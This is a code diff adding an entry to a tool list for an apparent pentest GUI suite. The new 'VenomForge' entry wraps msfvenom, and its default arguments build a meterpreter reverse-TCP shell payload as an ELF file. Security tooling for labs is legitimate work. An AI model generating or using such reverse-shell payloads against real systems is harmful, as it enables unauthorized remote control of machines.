@@ -34,6 +34,10 @@ TOOLS = [
  dict(d="vulnlaunch", cls="VulnLaunch", exe="vulnlaunch", backend="virsh",
       color="#00ff88", desc="VulnLaunch — vulnerable-lab VM launcher over virsh.",
       args="-c qemu:///system list --all", target="", warn="Boot lab images (Metasploitable/DVWA) isolated from prod networks."),
+ dict(d="venomforge", cls="VenomForge", exe="venomforge", backend="msfvenom",
+      color="#ff0040", desc="VenomForge — payload generator GUI over msfvenom.",
+      args="-p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /tmp/payload.elf", target="",
+      warn="LAB USE ONLY. Generating or using payloads outside authorized tests is illegal."),
 ]
 
 HEADER = "// Copyright (c) 2026 oday. All Rights Reserved.\n// Proprietary License, see LICENSE file.\n// Qt toolkit components remain under GNU (L)GPL by The Qt Company Ltd.\n"
